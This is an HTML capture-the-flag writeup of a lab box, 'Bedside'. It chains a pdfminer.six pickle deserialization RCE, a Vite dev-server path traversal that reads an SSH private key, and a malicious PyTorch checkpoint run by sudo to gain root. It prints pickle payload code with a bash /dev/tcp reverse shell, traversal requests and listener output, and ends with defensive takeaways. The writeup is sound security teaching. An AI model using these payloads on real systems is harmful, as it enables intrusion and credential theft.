@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bedside Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      bedside
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">Bedside</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-07-19</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Debian GNU/Linux 13 (trixie), reached first through a Docker container</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">pdfminer.six (PDF/CMap parsing) &nbsp;·&nbsp; Vite dev server (React) &nbsp;·&nbsp; Docker &nbsp;·&nbsp; PyTorch 2.5 + MONAI 1.5 training pipeline</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2025-64512 (pdfminer.six CMap pickle deserialization RCE)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>Bedside is a medical-imaging themed box where the same underlying bug — trusting a "data format" that is secretly a pickle — shows up twice, at opposite ends of the chain:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — a research subdomain fingerprinted via <code>X-Powered-By: pdfminer.six</code> is vulnerable to CVE-2025-64512: pdfminer resolves a font's CMap resource by filesystem path and unpickles whatever is there. Guessing the upload directory and uploading a real PDF alongside a malicious pickle gives RCE as <code>datawrangler</code> inside a Docker container.</li>
+      <li style="margin-bottom:6px;"><strong>Docker → host pivot</strong> — the container shares a host bind-mount and can reach an internal-only Vite dev server on <code>127.0.0.1:3000</code> (firewalled from outside). Its static file handler is vulnerable to URL-encoded path traversal, which is used to read <code>developer</code>'s SSH private key directly off the host disk.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — <code>developer</code> can run a MONAI/PyTorch training script as root via sudo. The script loads whichever checkpoint has the newest mtime through MONAI's <code>CheckpointLoader</code>, which hardcodes <code>torch.load(..., weights_only=False)</code>. The checkpoint directory is writable by <code>datawrangler</code> (the container account from step 1), so a pickle payload planted there executes as root the next time the script runs — the same bug class as the foothold, closing the loop.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sV 10.129.43.255
+
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp</pre>
+    <p>Port 3000 being <em>filtered</em> rather than closed is the first hint that something is listening there but firewalled from the external interface — worth remembering once there's a foothold. Port 80 is a static "Bedside Clinic" marketing page with nothing interesting on it, so the next step is virtual-host enumeration:</p>
+    <pre>echo "10.129.43.255 bedside.htb" | sudo tee -a /etc/hosts
+
+gobuster vhost -u http://bedside.htb/ \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --append-domain -t 40
+
+Found: research.bedside.htb   Status: 200 [Size: 3152]</pre>
+    <p>Out of 5000 guesses, exactly one returns a real 200 instead of the wildcard redirect. Adding it to <code>/etc/hosts</code> reveals a "Bedside Research Portal" — a file upload form for staff to submit medical imaging (PDF, images, archives). One response header gives away the processing stack immediately:</p>
+    <pre>HTTP/1.1 200 OK
+X-Powered-By: pdfminer.six</pre>
+
+    <h2>Initial Access — CVE-2025-64512</h2>
+    <p>CVE-2025-64512 is a deserialization bug in pdfminer.six's font/CMap resolution. When a PDF font's <code>/Encoding</code> references a CMap by name, pdfminer looks it up on disk — and if that lookup resolves outside the bundled CMap set, the library reads the target bytes and calls <code>pickle.loads()</code> on them with no check that the result is actually a CMap object. A crafted object with a <code>__reduce__</code> method runs as soon as it's reconstructed.</p>
+    <p>Exploiting it needs the exact filesystem path the upload form writes to. Rather than guess once, the fastest approach was firing a batch of candidate-path payloads (13 guesses at common <code>/var/www/*/uploads</code>-style locations) and letting the server's own validation errors leak the truth:</p>
+    <pre>curl -s -F "uploadFile=@trigger.pdf;type=application/pdf" http://research.bedside.htb/
+
+MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads</pre>
+    <p>With the real path confirmed, the exploit is two files uploaded in order — a resource pickle first, then a PDF that references it:</p>
+    <pre># payload.pickle.gz — malicious CMap resource
+class RCE:
+    def __init__(self, cmd): self.cmd = cmd
+    def __reduce__(self): return (os.system, (self.cmd,))
+
+revshell = f"/bin/bash -c 'bash -i >&/dev/tcp/{LHOST}/{LPORT} 0>&1'"
+cmd = f"echo {base64.b64encode(revshell.encode()).decode()} | base64 -d | bash"
+gzip.compress(pickle.dumps(RCE(cmd)))  -> payload.pickle.gz
+
+# trigger.pdf — legitimate PDF whose font Encoding points at the resource
+/Encoding /%2Fvar%2Fwww%2Fresearch.bedside.htb%2Fuploads%2Fpayload</pre>
+    <pre>curl -s -F "uploadFile=@payload.pickle.gz;type=application/gzip" http://research.bedside.htb/
+curl -s -F "uploadFile=@trigger.pdf;type=application/pdf"        http://research.bedside.htb/</pre>
+    <p>An async worker (later found as <code>/app/pdf_watcher.py</code> inside the container) polls the uploads directory every 30 seconds and runs <code>pdf2txt.py</code> against any new PDF for text extraction — which is what actually invokes pdfminer and triggers the deserialization.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">initial foothold</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4444</span></div>
+        <div class="t-out">connect to [10.10.16.199] from (UNKNOWN) [10.129.43.255] 59830</div>
+        <div class="t-success">datawrangler@data-wrangler:/app$ id</div>
+        <div class="t-out">uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)</div>
+      </div>
+    </div>
+
+    <h2>Docker Escape — Path Traversal to a Host SSH Key</h2>
+    <p><code>/.dockerenv</code> confirms the shell is inside a container. <code>mount</code> shows a bind-mounted <code>/datastore</code> backed by the host's <code>/dev/sda4</code> — shared storage that turns out to matter a lot later for privesc. More immediately useful: <code>/proc/net/tcp</code> shows something bound to <code>127.0.0.1:3000</code>, reachable from inside the container even though nmap saw it as filtered externally, because the container shares the host's network namespace.</p>
+    <pre>curl -s http://127.0.0.1:3000/ | tail -100
+# React app: "Bedside Clinic - Image Viewer", served by a Vite dev server (note the /@hmr client)</pre>
+    <p>Vite's dev server has had repeated path-traversal issues in its static file handler, and this instance is no exception — a URL-encoded traversal escapes the project root and reads arbitrary host files:</p>
+    <pre>curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fetc%2fos-release"
+
+PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
+NAME="Debian GNU/Linux"</pre>
+    <p>The same primitive reaches straight into <code>developer</code>'s home directory:</p>
+    <pre>curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fhome%2fdeveloper%2f.ssh%2fid_ed25519" \
+  -o developer_id_ed25519
+chmod 600 developer_id_ed25519</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">ssh as developer</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">ssh -i developer_id_ed25519 developer@10.129.43.255</span></div>
+        <div class="t-success">developer@bedside:~$ id</div>
+        <div class="t-out">uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)</div>
+        <div><span class="t-prompt">developer@bedside</span>:~$ <span class="t-cmd">cat user.txt</span></div>
+        <div class="t-success">HTB{… redacted …}</div>
+      </div>
+    </div>
+
+    <h2>Privilege Escalation — torch.load() via Sudo</h2>
+    <pre>developer@bedside:~$ sudo -l
+
+User developer may run the following commands on bedside:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</pre>
+    <p><strong>A quick gotcha worth flagging:</strong> sudoers command matching with a fixed argument list is exact. Running the script with any extra flags — e.g. <code>--epochs 1 --batch-size 1</code> — does not match the whitelisted command and falls straight through to interactive password auth, which looks like the rule "isn't working." It has to be invoked bare to hit the NOPASSWD entry.</p>
+    <p>Reading <code>/opt/trainer/bedside_trainer.py</code> (root-owned, world-readable) shows a MONAI/PyTorch training loop over <code>/datastore</code>: it promotes files from <code>staging/</code> to <code>processed/</code>, builds a tiny model from whatever image data it finds, then — before any actual training happens — loads the most recently modified checkpoint:</p>
+    <pre>latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # sorted by os.path.getmtime
+if latest_ckpt:
+    loader = CheckpointLoader(
+        load_path=str(latest_ckpt),
+        load_dict={"model": model, "optimizer": optimizer},
+        map_location=DEVICE,
+    )
+    loader(engine)   # invokes torch.load() on our file, as root</pre>
+    <p>MONAI's <code>CheckpointLoader</code> hardcodes the unsafe deserialization path regardless of PyTorch version:</p>
+    <pre># /usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py:125
+checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)</pre>
+    <p>Confirmed on target: <code>torch 2.5.0+cpu</code> (the <code>weights_only=True</code> default only landed in torch 2.6) and <code>monai 1.5.0</code> — so even a newer torch wouldn't help here, since MONAI overrides the default explicitly. Any <code>.pt</code> file is just a pickle stream with extra steps.</p>
+    <p><code>developer</code> has zero access to <code>/datastore</code> itself (owned <code>datawrangler:dataops</code>, mode <code>770</code>) — every path under it returns <code>Permission denied</code>. The plant has to happen from the still-open <code>datawrangler</code> container shell instead, which <em>is</em> in the <code>dataops</code> group:</p>
+    <pre># from the datawrangler container:
+# 1) a real, decodable image in processed/ — without one, the script exits
+#    early at "No data available to train" and never reaches the checkpoint load
+open('/datastore/processed/seed.png', 'wb').write(<valid 1x1 PNG bytes>)
+
+# 2) a malicious checkpoint — picked up as "latest" by mtime
+class RCE:
+    def __reduce__(self):
+        return (os.system, (cmd,))   # cmd = base64-wrapped reverse shell to 10.10.16.199:5555
+
+pickle.dump(RCE(), open('/datastore/checkpoints/checkpoint_epoch_9999.pt', 'wb'), protocol=2)</pre>
+    <p>With both files staged and a listener up on 5555, the trigger from the <code>developer</code> SSH session is the bare sudo command — no flags, to match the NOPASSWD rule exactly:</p>
+    <pre>developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py</pre>
+    <p><code>CheckpointLoader</code> picks up <code>checkpoint_epoch_9999.pt</code> as the newest file by mtime, <code>torch.load()</code> deserializes the planted <code>RCE.__reduce__</code>, and <code>os.system()</code> fires the reverse shell — as root, before a single training epoch runs.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -nlvp 5555</span></div>
+        <div class="t-out">Listening on 0.0.0.0 5555</div>
+        <div class="t-out">Connection received on 10.129.43.255 55210</div>
+        <div class="t-success">root@bedside:/home/developer# id</div>
+        <div class="t-out">uid=0(root) gid=0(root) groups=0(root)</div>
+        <div><span class="t-prompt">root@bedside</span>:~$ <span class="t-cmd">cat root.txt</span></div>
+        <div class="t-success">HTB{… redacted …}</div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/developer/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>pdfminer.six resolves CMap resources by path and unpickles them (CVE-2025-64512)</td><td><span class="severity-critical">Critical</span></td><td>Unauthenticated RCE as <code>datawrangler</code> in the processing container</td></tr>
+        <tr><td>Upload validation error echoes the absolute server-side destination path</td><td><span class="severity-medium">Medium</span></td><td>Removes the need to blindly guess the filesystem path required for exploitation</td></tr>
+        <tr><td>Vite dev server's static handler is vulnerable to URL-encoded path traversal on an internal-only port</td><td><span class="severity-high">High</span></td><td>Arbitrary host file read from within the container's network namespace, including SSH private keys</td></tr>
+        <tr><td>MONAI's <code>CheckpointLoader</code> hardcodes <code>torch.load(..., weights_only=False)</code> on the newest file in a group-writable checkpoint directory, run as root via sudo</td><td><span class="severity-critical">Critical</span></td><td>Local privilege escalation to root for any account able to write to <code>/datastore/checkpoints</code></td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Don't echo absolute server-side paths in validation errors.</strong> The "MIME type mismatch" message handed over the exact upload directory, turning a 13-path guessing exercise into a one-shot exploit.</li>
+      <li><strong>Pickle-based formats are code execution regardless of the file extension.</strong> A <code>.pt</code> checkpoint and a <code>.pickle.gz</code> CMap resource are the same underlying bug: anything built on Python's pickle protocol — <code>torch.save</code>/<code>load</code>, <code>joblib</code>, custom resource caches — executes attacker-chosen callables the moment it's deserialized. Extension and "it's just weights" framing don't change that.</li>
+      <li><strong>Library wrappers can silently defeat upstream safety defaults.</strong> PyTorch made <code>weights_only=True</code> the default in 2.6 specifically to close this class of bug, but MONAI's <code>CheckpointLoader</code> passes <code>weights_only=False</code> explicitly, overriding it. A safe default one layer down is worthless if a wrapper two layers up unsets it.</li>
+      <li><strong>A shared bind-mount plus a root-run consumer collapses the trust boundary between accounts.</strong> <code>datawrangler</code> and <code>developer</code> look unrelated, but because <code>developer</code>'s sudo rule deserializes whatever <code>datawrangler</code> can write to <code>/datastore/checkpoints</code>, they're functionally the same trust level. Least-privilege the writers of anything a privileged process later loads.</li>
+      <li><strong>A dev server is not a hardened static file host.</strong> Vite's dev server was reachable only via the container's shared network namespace, but "internal-only" isn't isolation once any code execution exists on that namespace — see my <a href="../blog/localhost-not-a-boundary.html">localhost-not-a-boundary</a> notes.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
